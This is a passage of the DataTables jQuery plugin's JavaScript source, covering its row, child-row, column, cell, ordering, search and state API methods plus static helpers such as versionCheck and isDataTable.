		return this.iterator( 'row', function ( settings, row ) {

			_fnInvalidate( settings, row, src );

		} );

	} );

	

	_api_registerPlural( 'rows().indexes()', 'row().index()', function () {

		return this.iterator( 'row', function ( settings, row ) {

			return row;

		}, 1 );

	} );

	

	_api_registerPlural( 'rows().ids()', 'row().id()', function ( hash ) {

		var a = [];

		var context = this.context;

	

		// `iterator` will drop undefined values, but in this case we want them

		for ( var i=0, ien=context.length ; i<ien ; i++ ) {

			for ( var j=0, jen=this[i].length ; j<jen ; j++ ) {

				var id = context[i].rowIdFn( context[i].aoData[ this[i][j] ]._aData );

				a.push( (hash === true ? '#' : '' )+ id );

			}

		}

	

		return new _Api( context, a );

	} );

	

	_api_registerPlural( 'rows().remove()', 'row().remove()', function () {

		var that = this;

	

		this.iterator( 'row', function ( settings, row, thatIdx ) {

			var data = settings.aoData;

			var rowData = data[ row ];

			var i, ien, j, jen;

			var loopRow, loopCells;

	

			data.splice( row, 1 );

	

			// Update the cached indexes

			for ( i=0, ien=data.length ; i<ien ; i++ ) {

				loopRow = data[i];

				loopCells = loopRow.anCells;

	

				// Rows

				if ( loopRow.nTr !== null ) {

					loopRow.nTr._DT_RowIndex = i;

				}

	

				// Cells

				if ( loopCells !== null ) {

					for ( j=0, jen=loopCells.length ; j<jen ; j++ ) {

						loopCells[j]._DT_CellIndex.row = i;

					}

				}

			}

	

			// Delete from the display arrays

			_fnDeleteIndex( settings.aiDisplayMaster, row );

			_fnDeleteIndex( settings.aiDisplay, row );

			_fnDeleteIndex( that[ thatIdx ], row, false ); // maintain local indexes

	

			// For server-side processing tables - subtract the deleted row from the count

			if ( settings._iRecordsDisplay > 0 ) {

				settings._iRecordsDisplay--;

			}

	

			// Check for an 'overflow' they case for displaying the table

			_fnLengthOverflow( settings );

	

			// Remove the row's ID reference if there is one

			var id = settings.rowIdFn( rowData._aData );

			if ( id !== undefined ) {

				delete settings.aIds[ id ];

			}

		} );

	

		this.iterator( 'table', function ( settings ) {

			for ( var i=0, ien=settings.aoData.length ; i<ien ; i++ ) {

				settings.aoData[i].idx = i;

			}

		} );

	

		return this;

	} );

	

	

	_api_register( 'rows.add()', function ( rows ) {

		var newRows = this.iterator( 'table', function ( settings ) {

				var row, i, ien;

				var out = [];

	

				for ( i=0, ien=rows.length ; i<ien ; i++ ) {

					row = rows[i];

	

					if ( row.nodeName && row.nodeName.toUpperCase() === 'TR' ) {

						out.push( _fnAddTr( settings, row )[0] );

					}

					else {

						out.push( _fnAddData( settings, row ) );

					}

				}

	

				return out;

			}, 1 );

	

		// Return an Api.rows() extended instance, so rows().nodes() etc can be used

		var modRows = this.rows( -1 );

		modRows.pop();

		$.merge( modRows, newRows );

	

		return modRows;

	} );

	

	

	

	

	

	/**

	 *

	 */

	_api_register( 'row()', function ( selector, opts ) {

		return _selector_first( this.rows( selector, opts ) );

	} );

	

	

	_api_register( 'row().data()', function ( data ) {

		var ctx = this.context;

	

		if ( data === undefined ) {

			// Get

			return ctx.length && this.length ?

				ctx[0].aoData[ this[0] ]._aData :

				undefined;

		}

	

		// Set

		var row = ctx[0].aoData[ this[0] ];

		row._aData = data;

	

		// If the DOM has an id, and the data source is an array

		if ( $.isArray( data ) && row.nTr && row.nTr.id ) {

			_fnSetObjectDataFn( ctx[0].rowId )( data, row.nTr.id );

		}

	

		// Automatically invalidate

		_fnInvalidate( ctx[0], this[0], 'data' );

	

		return this;

	} );

	

	

	_api_register( 'row().node()', function () {

		var ctx = this.context;

	

		return ctx.length && this.length ?

			ctx[0].aoData[ this[0] ].nTr || null :

			null;

	} );

	

	

	_api_register( 'row.add()', function ( row ) {

		// Allow a jQuery object to be passed in - only a single row is added from

		// it though - the first element in the set

		if ( row instanceof $ && row.length ) {

			row = row[0];

		}

	

		var rows = this.iterator( 'table', function ( settings ) {

			if ( row.nodeName && row.nodeName.toUpperCase() === 'TR' ) {

				return _fnAddTr( settings, row )[0];

			}

			return _fnAddData( settings, row );

		} );

	

		// Return an Api.rows() extended instance, with the newly added row selected

		return this.row( rows[0] );

	} );

	

	

	

	var __details_add = function ( ctx, row, data, klass )

	{

		// Convert to array of TR elements

		var rows = [];

		var addRow = function ( r, k ) {

			// Recursion to allow for arrays of jQuery objects

			if ( $.isArray( r ) || r instanceof $ ) {

				for ( var i=0, ien=r.length ; i<ien ; i++ ) {

					addRow( r[i], k );

				}

				return;

			}

	

			// If we get a TR element, then just add it directly - up to the dev

			// to add the correct number of columns etc

			if ( r.nodeName && r.nodeName.toLowerCase() === 'tr' ) {

				rows.push( r );

			}

			else {

				// Otherwise create a row with a wrapper

				var created = $('<tr><td/></tr>').addClass( k );

				$('td', created)

					.addClass( k )

					.html( r )

					[0].colSpan = _fnVisbleColumns( ctx );

	

				rows.push( created[0] );

			}

		};

	

		addRow( data, klass );

	

		if ( row._details ) {

			row._details.detach();

		}

	

		row._details = $(rows);

	

		// If the children were already shown, that state should be retained

		if ( row._detailsShow ) {

			row._details.insertAfter( row.nTr );

		}

	};

	

	

	var __details_remove = function ( api, idx )

	{

		var ctx = api.context;

	

		if ( ctx.length ) {

			var row = ctx[0].aoData[ idx !== undefined ? idx : api[0] ];

	

			if ( row && row._details ) {

				row._details.remove();

	

				row._detailsShow = undefined;

				row._details = undefined;

			}

		}

	};

	

	

	var __details_display = function ( api, show ) {

		var ctx = api.context;

	

		if ( ctx.length && api.length ) {

			var row = ctx[0].aoData[ api[0] ];

	

			if ( row._details ) {

				row._detailsShow = show;

	

				if ( show ) {

					row._details.insertAfter( row.nTr );

				}

				else {

					row._details.detach();

				}

	

				__details_events( ctx[0] );

			}

		}

	};

	

	

	var __details_events = function ( settings )

	{

		var api = new _Api( settings );

		var namespace = '.dt.DT_details';

		var drawEvent = 'draw'+namespace;

		var colvisEvent = 'column-visibility'+namespace;

		var destroyEvent = 'destroy'+namespace;

		var data = settings.aoData;

	

		api.off( drawEvent +' '+ colvisEvent +' '+ destroyEvent );

	

		if ( _pluck( data, '_details' ).length > 0 ) {

			// On each draw, insert the required elements into the document

			api.on( drawEvent, function ( e, ctx ) {

				if ( settings !== ctx ) {

					return;

				}

	

				api.rows( {page:'current'} ).eq(0).each( function (idx) {

					// Internal data grab

					var row = data[ idx ];

	

					if ( row._detailsShow ) {

						row._details.insertAfter( row.nTr );

					}

				} );

			} );

	

			// Column visibility change - update the colspan

			api.on( colvisEvent, function ( e, ctx, idx, vis ) {

				if ( settings !== ctx ) {

					return;

				}

	

				// Update the colspan for the details rows (note, only if it already has

				// a colspan)

				var row, visible = _fnVisbleColumns( ctx );

	

				for ( var i=0, ien=data.length ; i<ien ; i++ ) {

					row = data[i];

	

					if ( row._details ) {

						row._details.children('td[colspan]').attr('colspan', visible );

					}

				}

			} );

	

			// Table destroyed - nuke any child rows

			api.on( destroyEvent, function ( e, ctx ) {

				if ( settings !== ctx ) {

					return;

				}

	

				for ( var i=0, ien=data.length ; i<ien ; i++ ) {

					if ( data[i]._details ) {

						__details_remove( api, i );

					}

				}

			} );

		}

	};

	

	// Strings for the method names to help minification

	var _emp = '';

	var _child_obj = _emp+'row().child';

	var _child_mth = _child_obj+'()';

	

	// data can be:

	//  tr

	//  string

	//  jQuery or array of any of the above

	_api_register( _child_mth, function ( data, klass ) {

		var ctx = this.context;

	

		if ( data === undefined ) {

			// get

			return ctx.length && this.length ?

				ctx[0].aoData[ this[0] ]._details :

				undefined;

		}

		else if ( data === true ) {

			// show

			this.child.show();

		}

		else if ( data === false ) {

			// remove

			__details_remove( this );

		}

		else if ( ctx.length && this.length ) {

			// set

			__details_add( ctx[0], ctx[0].aoData[ this[0] ], data, klass );

		}

	

		return this;

	} );

	

	

	_api_register( [

		_child_obj+'.show()',

		_child_mth+'.show()' // only when `child()` was called with parameters (without

	], function ( show ) {   // it returns an object and this method is not executed)

		__details_display( this, true );

		return this;

	} );

	

	

	_api_register( [

		_child_obj+'.hide()',

		_child_mth+'.hide()' // only when `child()` was called with parameters (without

	], function () {         // it returns an object and this method is not executed)

		__details_display( this, false );

		return this;

	} );

	

	

	_api_register( [

		_child_obj+'.remove()',

		_child_mth+'.remove()' // only when `child()` was called with parameters (without

	], function () {           // it returns an object and this method is not executed)

		__details_remove( this );

		return this;

	} );

	

	

	_api_register( _child_obj+'.isShown()', function () {

		var ctx = this.context;

	

		if ( ctx.length && this.length ) {

			// _detailsShown as false or undefined will fall through to return false

			return ctx[0].aoData[ this[0] ]._detailsShow || false;

		}

		return false;

	} );

	

	

	

	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

	 * Columns

	 *

	 * {integer}           - column index (>=0 count from left, <0 count from right)

	 * "{integer}:visIdx"  - visible column index (i.e. translate to column index)  (>=0 count from left, <0 count from right)

	 * "{integer}:visible" - alias for {integer}:visIdx  (>=0 count from left, <0 count from right)

	 * "{string}:name"     - column name

	 * "{string}"          - jQuery selector on column header nodes

	 *

	 */

	

	// can be an array of these items, comma separated list, or an array of comma

	// separated lists

	

	var __re_column_selector = /^([^:]+):(name|visIdx|visible)$/;

	

	

	// r1 and r2 are redundant - but it means that the parameters match for the

	// iterator callback in columns().data()

	var __columnData = function ( settings, column, r1, r2, rows ) {

		var a = [];

		for ( var row=0, ien=rows.length ; row<ien ; row++ ) {

			a.push( _fnGetCellData( settings, rows[row], column ) );

		}

		return a;

	};

	

	

	var __column_selector = function ( settings, selector, opts )

	{

		var

			columns = settings.aoColumns,

			names = _pluck( columns, 'sName' ),

			nodes = _pluck( columns, 'nTh' );

	

		var run = function ( s ) {

			var selInt = _intVal( s );

	

			// Selector - all

			if ( s === '' ) {

				return _range( columns.length );

			}

	

			// Selector - index

			if ( selInt !== null ) {

				return [ selInt >= 0 ?

					selInt : // Count from left

					columns.length + selInt // Count from right (+ because its a negative value)

				];

			}

	

			// Selector = function

			if ( typeof s === 'function' ) {

				var rows = _selector_row_indexes( settings, opts );

	

				return $.map( columns, function (col, idx) {

					return s(

							idx,

							__columnData( settings, idx, 0, 0, rows ),

							nodes[ idx ]

						) ? idx : null;

				} );

			}

	

			// jQuery or string selector

			var match = typeof s === 'string' ?

				s.match( __re_column_selector ) :

				'';

	

			if ( match ) {

				switch( match[2] ) {

					case 'visIdx':

					case 'visible':

						var idx = parseInt( match[1], 10 );

						// Visible index given, convert to column index

						if ( idx < 0 ) {

							// Counting from the right

							var visColumns = $.map( columns, function (col,i) {

								return col.bVisible ? i : null;

							} );

							return [ visColumns[ visColumns.length + idx ] ];

						}

						// Counting from the left

						return [ _fnVisibleToColumnIndex( settings, idx ) ];

	

					case 'name':

						// match by name. `names` is column index complete and in order

						return $.map( names, function (name, i) {

							return name === match[1] ? i : null;

						} );

	

					default:

						return [];

				}

			}

	

			// Cell in the table body

			if ( s.nodeName && s._DT_CellIndex ) {

				return [ s._DT_CellIndex.column ];

			}

	

			// jQuery selector on the TH elements for the columns

			var jqResult = $( nodes )

				.filter( s )

				.map( function () {

					return $.inArray( this, nodes ); // `nodes` is column index complete and in order

				} )

				.toArray();

	

			if ( jqResult.length || ! s.nodeName ) {

				return jqResult;

			}

	

			// Otherwise a node which might have a `dt-column` data attribute, or be

			// a child or such an element

			var host = $(s).closest('*[data-dt-column]');

			return host.length ?

				[ host.data('dt-column') ] :

				[];

		};

	

		return _selector_run( 'column', selector, run, settings, opts );

	};

	

	

	var __setColumnVis = function ( settings, column, vis ) {

		var

			cols = settings.aoColumns,

			col  = cols[ column ],

			data = settings.aoData,

			row, cells, i, ien, tr;

	

		// Get

		if ( vis === undefined ) {

			return col.bVisible;

		}

	

		// Set

		// No change

		if ( col.bVisible === vis ) {

			return;

		}

	

		if ( vis ) {

			// Insert column

			// Need to decide if we should use appendChild or insertBefore

			var insertBefore = $.inArray( true, _pluck(cols, 'bVisible'), column+1 );

	

			for ( i=0, ien=data.length ; i<ien ; i++ ) {

				tr = data[i].nTr;

				cells = data[i].anCells;

	

				if ( tr ) {

					// insertBefore can act like appendChild if 2nd arg is null

					tr.insertBefore( cells[ column ], cells[ insertBefore ] || null );

				}

			}

		}

		else {

			// Remove column

			$( _pluck( settings.aoData, 'anCells', column ) ).detach();

		}

	

		// Common actions

		col.bVisible = vis;

	};

	

	

	_api_register( 'columns()', function ( selector, opts ) {

		// argument shifting

		if ( selector === undefined ) {

			selector = '';

		}

		else if ( $.isPlainObject( selector ) ) {

			opts = selector;

			selector = '';

		}

	

		opts = _selector_opts( opts );

	

		var inst = this.iterator( 'table', function ( settings ) {

			return __column_selector( settings, selector, opts );

		}, 1 );

	

		// Want argument shifting here and in _row_selector?

		inst.selector.cols = selector;

		inst.selector.opts = opts;

	

		return inst;

	} );

	

	_api_registerPlural( 'columns().header()', 'column().header()', function ( selector, opts ) {

		return this.iterator( 'column', function ( settings, column ) {

			return settings.aoColumns[column].nTh;

		}, 1 );

	} );

	

	_api_registerPlural( 'columns().footer()', 'column().footer()', function ( selector, opts ) {

		return this.iterator( 'column', function ( settings, column ) {

			return settings.aoColumns[column].nTf;

		}, 1 );

	} );

	

	_api_registerPlural( 'columns().data()', 'column().data()', function () {

		return this.iterator( 'column-rows', __columnData, 1 );

	} );

	

	_api_registerPlural( 'columns().dataSrc()', 'column().dataSrc()', function () {

		return this.iterator( 'column', function ( settings, column ) {

			return settings.aoColumns[column].mData;

		}, 1 );

	} );

	

	_api_registerPlural( 'columns().cache()', 'column().cache()', function ( type ) {

		return this.iterator( 'column-rows', function ( settings, column, i, j, rows ) {

			return _pluck_order( settings.aoData, rows,

				type === 'search' ? '_aFilterData' : '_aSortData', column

			);

		}, 1 );

	} );

	

	_api_registerPlural( 'columns().nodes()', 'column().nodes()', function () {

		return this.iterator( 'column-rows', function ( settings, column, i, j, rows ) {

			return _pluck_order( settings.aoData, rows, 'anCells', column ) ;

		}, 1 );

	} );

	

	_api_registerPlural( 'columns().visible()', 'column().visible()', function ( vis, calc ) {

		var that = this;

		var ret = this.iterator( 'column', function ( settings, column ) {

			if ( vis === undefined ) {

				return settings.aoColumns[ column ].bVisible;

			} // else

			__setColumnVis( settings, column, vis );

		} );

	

		// Group the column visibility changes

		if ( vis !== undefined ) {

			this.iterator( 'table', function ( settings ) {

				// Redraw the header after changes

				_fnDrawHead( settings, settings.aoHeader );

				_fnDrawHead( settings, settings.aoFooter );

		

				// Update colspan for no records display. Child rows and extensions will use their own

				// listeners to do this - only need to update the empty table item here

				if ( ! settings.aiDisplay.length ) {

					$(settings.nTBody).find('td[colspan]').attr('colspan', _fnVisbleColumns(settings));

				}

		

				_fnSaveState( settings );

	

				// Second loop once the first is done for events

				that.iterator( 'column', function ( settings, column ) {

					_fnCallbackFire( settings, null, 'column-visibility', [settings, column, vis, calc] );

				} );

	

				if ( calc === undefined || calc ) {

					that.columns.adjust();

				}

			});

		}

	

		return ret;

	} );

	

	_api_registerPlural( 'columns().indexes()', 'column().index()', function ( type ) {

		return this.iterator( 'column', function ( settings, column ) {

			return type === 'visible' ?

				_fnColumnIndexToVisible( settings, column ) :

				column;

		}, 1 );

	} );

	

	_api_register( 'columns.adjust()', function () {

		return this.iterator( 'table', function ( settings ) {

			_fnAdjustColumnSizing( settings );

		}, 1 );

	} );

	

	_api_register( 'column.index()', function ( type, idx ) {

		if ( this.context.length !== 0 ) {

			var ctx = this.context[0];

	

			if ( type === 'fromVisible' || type === 'toData' ) {

				return _fnVisibleToColumnIndex( ctx, idx );

			}

			else if ( type === 'fromData' || type === 'toVisible' ) {

				return _fnColumnIndexToVisible( ctx, idx );

			}

		}

	} );

	

	_api_register( 'column()', function ( selector, opts ) {

		return _selector_first( this.columns( selector, opts ) );

	} );

	

	

	

	var __cell_selector = function ( settings, selector, opts )

	{

		var data = settings.aoData;

		var rows = _selector_row_indexes( settings, opts );

		var cells = _removeEmpty( _pluck_order( data, rows, 'anCells' ) );

		var allCells = $( [].concat.apply([], cells) );

		var row;

		var columns = settings.aoColumns.length;

		var a, i, ien, j, o, host;

	

		var run = function ( s ) {

			var fnSelector = typeof s === 'function';

	

			if ( s === null || s === undefined || fnSelector ) {

				// All cells and function selectors

				a = [];

	

				for ( i=0, ien=rows.length ; i<ien ; i++ ) {

					row = rows[i];

	

					for ( j=0 ; j<columns ; j++ ) {

						o = {

							row: row,

							column: j

						};

	

						if ( fnSelector ) {

							// Selector - function

							host = data[ row ];

	

							if ( s( o, _fnGetCellData(settings, row, j), host.anCells ? host.anCells[j] : null ) ) {

								a.push( o );

							}

						}

						else {

							// Selector - all

							a.push( o );

						}

					}

				}

	

				return a;

			}

			

			// Selector - index

			if ( $.isPlainObject( s ) ) {

				// Valid cell index and its in the array of selectable rows

				return s.column !== undefined && s.row !== undefined && $.inArray( s.row, rows ) !== -1 ?

					[s] :

					[];

			}

	

			// Selector - jQuery filtered cells

			var jqResult = allCells

				.filter( s )

				.map( function (i, el) {

					return { // use a new object, in case someone changes the values

						row:    el._DT_CellIndex.row,

						column: el._DT_CellIndex.column

	 				};

				} )

				.toArray();

	

			if ( jqResult.length || ! s.nodeName ) {

				return jqResult;

			}

	

			// Otherwise the selector is a node, and there is one last option - the

			// element might be a child of an element which has dt-row and dt-column

			// data attributes

			host = $(s).closest('*[data-dt-row]');

			return host.length ?

				[ {

					row: host.data('dt-row'),

					column: host.data('dt-column')

				} ] :

				[];

		};

	

		return _selector_run( 'cell', selector, run, settings, opts );

	};

	

	

	

	

	_api_register( 'cells()', function ( rowSelector, columnSelector, opts ) {

		// Argument shifting

		if ( $.isPlainObject( rowSelector ) ) {

			// Indexes

			if ( rowSelector.row === undefined ) {

				// Selector options in first parameter

				opts = rowSelector;

				rowSelector = null;

			}

			else {

				// Cell index objects in first parameter

				opts = columnSelector;

				columnSelector = null;

			}

		}

		if ( $.isPlainObject( columnSelector ) ) {

			opts = columnSelector;

			columnSelector = null;

		}

	

		// Cell selector

		if ( columnSelector === null || columnSelector === undefined ) {

			return this.iterator( 'table', function ( settings ) {

				return __cell_selector( settings, rowSelector, _selector_opts( opts ) );

			} );

		}

	

		// The default built in options need to apply to row and columns

		var internalOpts = opts ? {

			page: opts.page,

			order: opts.order,

			search: opts.search

		} : {};

	

		// Row + column selector

		var columns = this.columns( columnSelector, internalOpts );

		var rows = this.rows( rowSelector, internalOpts );

		var i, ien, j, jen;

	

		var cellsNoOpts = this.iterator( 'table', function ( settings, idx ) {

			var a = [];

	

			for ( i=0, ien=rows[idx].length ; i<ien ; i++ ) {

				for ( j=0, jen=columns[idx].length ; j<jen ; j++ ) {

					a.push( {

						row:    rows[idx][i],

						column: columns[idx][j]

					} );

				}

			}

	

			return a;

		}, 1 );

	

		// There is currently only one extension which uses a cell selector extension

		// It is a _major_ performance drag to run this if it isn't needed, so this is

		// an extension specific check at the moment

		var cells = opts && opts.selected ?

			this.cells( cellsNoOpts, opts ) :

			cellsNoOpts;

	

		$.extend( cells.selector, {

			cols: columnSelector,

			rows: rowSelector,

			opts: opts

		} );

	

		return cells;

	} );

	

	

	_api_registerPlural( 'cells().nodes()', 'cell().node()', function () {

		return this.iterator( 'cell', function ( settings, row, column ) {

			var data = settings.aoData[ row ];

	

			return data && data.anCells ?

				data.anCells[ column ] :

				undefined;

		}, 1 );

	} );

	

	

	_api_register( 'cells().data()', function () {

		return this.iterator( 'cell', function ( settings, row, column ) {

			return _fnGetCellData( settings, row, column );

		}, 1 );

	} );

	

	

	_api_registerPlural( 'cells().cache()', 'cell().cache()', function ( type ) {

		type = type === 'search' ? '_aFilterData' : '_aSortData';

	

		return this.iterator( 'cell', function ( settings, row, column ) {

			return settings.aoData[ row ][ type ][ column ];

		}, 1 );

	} );

	

	

	_api_registerPlural( 'cells().render()', 'cell().render()', function ( type ) {

		return this.iterator( 'cell', function ( settings, row, column ) {

			return _fnGetCellData( settings, row, column, type );

		}, 1 );

	} );

	

	

	_api_registerPlural( 'cells().indexes()', 'cell().index()', function () {

		return this.iterator( 'cell', function ( settings, row, column ) {

			return {

				row: row,

				column: column,

				columnVisible: _fnColumnIndexToVisible( settings, column )

			};

		}, 1 );

	} );

	

	

	_api_registerPlural( 'cells().invalidate()', 'cell().invalidate()', function ( src ) {

		return this.iterator( 'cell', function ( settings, row, column ) {

			_fnInvalidate( settings, row, src, column );

		} );

	} );

	

	

	

	_api_register( 'cell()', function ( rowSelector, columnSelector, opts ) {

		return _selector_first( this.cells( rowSelector, columnSelector, opts ) );

	} );

	

	

	_api_register( 'cell().data()', function ( data ) {

		var ctx = this.context;

		var cell = this[0];

	

		if ( data === undefined ) {

			// Get

			return ctx.length && cell.length ?

				_fnGetCellData( ctx[0], cell[0].row, cell[0].column ) :

				undefined;

		}

	

		// Set

		_fnSetCellData( ctx[0], cell[0].row, cell[0].column, data );

		_fnInvalidate( ctx[0], cell[0].row, 'data', cell[0].column );

	

		return this;

	} );

	

	

	

	/**

	 * Get current ordering (sorting) that has been applied to the table.

	 *

	 * @returns {array} 2D array containing the sorting information for the first

	 *   table in the current context. Each element in the parent array represents

	 *   a column being sorted upon (i.e. multi-sorting with two columns would have

	 *   2 inner arrays). The inner arrays may have 2 or 3 elements. The first is

	 *   the column index that the sorting condition applies to, the second is the

	 *   direction of the sort (`desc` or `asc`) and, optionally, the third is the

	 *   index of the sorting order from the `column.sorting` initialisation array.

	 *//**

	 * Set the ordering for the table.

	 *

	 * @param {integer} order Column index to sort upon.

	 * @param {string} direction Direction of the sort to be applied (`asc` or `desc`)

	 * @returns {DataTables.Api} this

	 *//**

	 * Set the ordering for the table.

	 *

	 * @param {array} order 1D array of sorting information to be applied.

	 * @param {array} [...] Optional additional sorting conditions

	 * @returns {DataTables.Api} this

	 *//**

	 * Set the ordering for the table.

	 *

	 * @param {array} order 2D array of sorting information to be applied.

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'order()', function ( order, dir ) {

		var ctx = this.context;

	

		if ( order === undefined ) {

			// get

			return ctx.length !== 0 ?

				ctx[0].aaSorting :

				undefined;

		}

	

		// set

		if ( typeof order === 'number' ) {

			// Simple column / direction passed in

			order = [ [ order, dir ] ];

		}

		else if ( order.length && ! $.isArray( order[0] ) ) {

			// Arguments passed in (list of 1D arrays)

			order = Array.prototype.slice.call( arguments );

		}

		// otherwise a 2D array was passed in

	

		return this.iterator( 'table', function ( settings ) {

			settings.aaSorting = order.slice();

		} );

	} );

	

	

	/**

	 * Attach a sort listener to an element for a given column

	 *

	 * @param {node|jQuery|string} node Identifier for the element(s) to attach the

	 *   listener to. This can take the form of a single DOM node, a jQuery

	 *   collection of nodes or a jQuery selector which will identify the node(s).

	 * @param {integer} column the column that a click on this node will sort on

	 * @param {function} [callback] callback function when sort is run

	 * @returns {DataTables.Api} this

	 */

	_api_register( 'order.listener()', function ( node, column, callback ) {

		return this.iterator( 'table', function ( settings ) {

			_fnSortAttachListener( settings, node, column, callback );

		} );

	} );

	

	

	_api_register( 'order.fixed()', function ( set ) {

		if ( ! set ) {

			var ctx = this.context;

			var fixed = ctx.length ?

				ctx[0].aaSortingFixed :

				undefined;

	

			return $.isArray( fixed ) ?

				{ pre: fixed } :

				fixed;

		}

	

		return this.iterator( 'table', function ( settings ) {

			settings.aaSortingFixed = $.extend( true, {}, set );

		} );

	} );

	

	

	// Order by the selected column(s)

	_api_register( [

		'columns().order()',

		'column().order()'

	], function ( dir ) {

		var that = this;

	

		return this.iterator( 'table', function ( settings, i ) {

			var sort = [];

	

			$.each( that[i], function (j, col) {

				sort.push( [ col, dir ] );

			} );

	

			settings.aaSorting = sort;

		} );

	} );

	

	

	

	_api_register( 'search()', function ( input, regex, smart, caseInsen ) {

		var ctx = this.context;

	

		if ( input === undefined ) {

			// get

			return ctx.length !== 0 ?

				ctx[0].oPreviousSearch.sSearch :

				undefined;

		}

	

		// set

		return this.iterator( 'table', function ( settings ) {

			if ( ! settings.oFeatures.bFilter ) {

				return;

			}

	

			_fnFilterComplete( settings, $.extend( {}, settings.oPreviousSearch, {

				"sSearch": input+"",

				"bRegex":  regex === null ? false : regex,

				"bSmart":  smart === null ? true  : smart,

				"bCaseInsensitive": caseInsen === null ? true : caseInsen

			} ), 1 );

		} );

	} );

	

	

	_api_registerPlural(

		'columns().search()',

		'column().search()',

		function ( input, regex, smart, caseInsen ) {

			return this.iterator( 'column', function ( settings, column ) {

				var preSearch = settings.aoPreSearchCols;

	

				if ( input === undefined ) {

					// get

					return preSearch[ column ].sSearch;

				}

	

				// set

				if ( ! settings.oFeatures.bFilter ) {

					return;

				}

	

				$.extend( preSearch[ column ], {

					"sSearch": input+"",

					"bRegex":  regex === null ? false : regex,

					"bSmart":  smart === null ? true  : smart,

					"bCaseInsensitive": caseInsen === null ? true : caseInsen

				} );

	

				_fnFilterComplete( settings, settings.oPreviousSearch, 1 );

			} );

		}

	);

	

	/*

	 * State API methods

	 */

	

	_api_register( 'state()', function () {

		return this.context.length ?

			this.context[0].oSavedState :

			null;

	} );

	

	

	_api_register( 'state.clear()', function () {

		return this.iterator( 'table', function ( settings ) {

			// Save an empty object

			settings.fnStateSaveCallback.call( settings.oInstance, settings, {} );

		} );

	} );

	

	

	_api_register( 'state.loaded()', function () {

		return this.context.length ?

			this.context[0].oLoadedState :

			null;

	} );

	

	

	_api_register( 'state.save()', function () {

		return this.iterator( 'table', function ( settings ) {

			_fnSaveState( settings );

		} );

	} );

	

	

	

	/**

	 * Provide a common method for plug-ins to check the version of DataTables being

	 * used, in order to ensure compatibility.

	 *

	 *  @param {string} version Version string to check for, in the format "X.Y.Z".

	 *    Note that the formats "X" and "X.Y" are also acceptable.

	 *  @returns {boolean} true if this version of DataTables is greater or equal to

	 *    the required version, or false if this version of DataTales is not

	 *    suitable

	 *  @static

	 *  @dtopt API-Static

	 *

	 *  @example

	 *    alert( $.fn.dataTable.versionCheck( '1.9.0' ) );

	 */

	DataTable.versionCheck = DataTable.fnVersionCheck = function( version )

	{

		var aThis = DataTable.version.split('.');

		var aThat = version.split('.');

		var iThis, iThat;

	

		for ( var i=0, iLen=aThat.length ; i<iLen ; i++ ) {

			iThis = parseInt( aThis[i], 10 ) || 0;

			iThat = parseInt( aThat[i], 10 ) || 0;

	

			// Parts are the same, keep comparing

			if (iThis === iThat) {

				continue;

			}

	

			// Parts are different, return immediately

			return iThis > iThat;

		}

	

		return true;

	};

	

	

	/**

	 * Check if a `<table>` node is a DataTable table already or not.

	 *

	 *  @param {node|jquery|string} table Table node, jQuery object or jQuery

	 *      selector for the table to test. Note that if more than more than one

	 *      table is passed on, only the first will be checked

	 *  @returns {boolean} true the table given is a DataTable, or false otherwise

	 *  @static

	 *  @dtopt API-Static

	 *

	 *  @example

	 *    if ( ! $.fn.DataTable.isDataTable( '#example' ) ) {

	 *      $('#example').dataTable();

	 *    }

	 */

	DataTable.isDataTable = DataTable.fnIsDataTable = function ( table )

	{

		var t = $(table).get(0);

		var is = false;

	

		if ( table instanceof DataTable.Api ) {

			return true;

		}

	

		$.each( DataTable.settings, function (i, o) {

			var head = o.nScrollHead ? $('table', o.nScrollHead)[0] : null;

			var foot = o.nScrollFoot ? $('table', o.nScrollFoot)[0] : null;

	

			if ( o.nTable === t || head === t || foot === t ) {

				is = true;

			}

		} );

	

		return is;

	};

	

	

	/**

	 * Get all DataTable tables that have been initialised - optionally you can

	 * select to get only currently visible tables.

	 *

	 *  @param {boolean} [visible=false] Flag to indicate if you want all (default)

	 *    or visible tables only.

	 *  @returns {array} Array of `table` nodes (not DataTable instances) which are

	 *    DataTables

	 *  @static

	 *  @dtopt API-Static

	 *

	 *  @example

	 *    $.each( $.fn.dataTable.tables(true), function () {

	 *      $(table).DataTable().columns.adjust();

	 *    } );

	 */

	DataTable.tables = DataTable.fnTables = function ( visible )

	{

		var api = false;

	

		if ( $.isPlainObject( visible ) ) {

			api = visible.api;

			visible = visible.visible;

		}

	

		var a = $.map( DataTable.settings, function (o) {

			if ( !visible || (visible && $(o.nTable).is(':visible')) ) {

				return o.nTable;

			}

		} );

	

		return api ?

			new _Api( a ) :

			a;

	};

	

	

	/**

	 * Convert from camel case parameters to Hungarian notation. This is made public

	 * for the extensions to provide the same ability as DataTables core to accept

	 * either the 1.9 style Hungarian notation, or the 1.10+ style camelCase

	 * parameters.

	 *

	 *  @param {object} src The model object which holds all parameters that can be

	 *    mapped.

	 *  @param {object} user The object to convert from camel case to Hungarian.

	 *  @param {boolean} force When set to `true`, properties which already have a

	 *    Hungarian value in the `user` object will be overwritten. Otherwise they

	 *    won't be.

	 */

	DataTable.camelToHungarian = _fnCamelToHungarian;

	

	

	

	/**

	 *

	 */

	_api_register( '$()', function ( selector, opts ) {

		var

			rows   = this.rows( opts ).nodes(), // Get all rows

			jqRows = $(rows);

	

		return $( [].concat(

			jqRows.filter( selector ).toArray(),

			jqRows.find( selector ).toArray()

		) );

	} );

	

	

	// jQuery functions to operate on the tables

	$.each( [ 'on', 'one', 'off' ], function (i, key) {

		_api_register( key+'()', function ( /* event, handler */ ) {

			var args = Array.prototype.slice.call(arguments);

	

			// Add the `dt` namespace automatically if it isn't already present

			args[0] = $.map( args[0].split( /\s/ ), function ( e ) {

				return ! e.match(/\.dt\b/) ?

					e+'.dt' :

					e;

				} ).join( ' ' );

	

			var inst = $( this.tables().nodes() );

			inst[key].apply( inst, args );

			return this;

		} );

	} );

	

	

	_api_register( 'clear()', function () {

		return this.iterator( 'table', function ( settings ) {

			_fnClearTable( settings );

		} );

	} );

	

	

	_api_register( 'settings()', function () {

		return new _Api( this.context, this.context );

	} );

	

	

	_api_register( 'init()', function () {

		var ctx = this.context;

		return ctx.length ? ctx[0].oInit : null;

	} );

	

	

	_api_register( 'data()', function () {

		return this.iterator( 'table', function ( settings ) {

			return _pluck( settings.aoData, '_aData' );

		} ).flatten();

	} );

	

	

	_api_register( 'destroy()', function ( remove ) {

		remove = remove || false;

	

